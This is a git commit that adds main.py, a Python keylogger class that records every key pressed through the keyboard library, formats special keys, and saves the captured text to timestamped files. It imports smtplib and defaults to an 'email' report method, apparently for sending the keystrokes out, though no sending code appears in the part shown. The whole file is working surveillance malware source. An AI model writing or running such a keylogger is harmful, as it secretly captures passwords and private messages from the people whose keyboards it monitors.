83fc8bf5b07a8bc4c229546c34bb7b09cf87621f
Matteo <spartacus990@gmail.com>
2021-10-26 23:08:56 +0200

    Initial commit

---
+++ main.py
@@ -0,0 +1,38 @@
+import keyboard
+import smtplib
+from threading import Timer
+from datetime import datetime
+
+
+class Keylogger:
+
+    def __init__(self, interval, report_method="email"):
+        self.interval = interval
+        self.report_method = report_method
+        self.log = ""
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
+
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
+
+    def update_filename(self):
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+    def report_to_file(self):
+        with open(f"{self.filename}.txt", "w") as f:
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
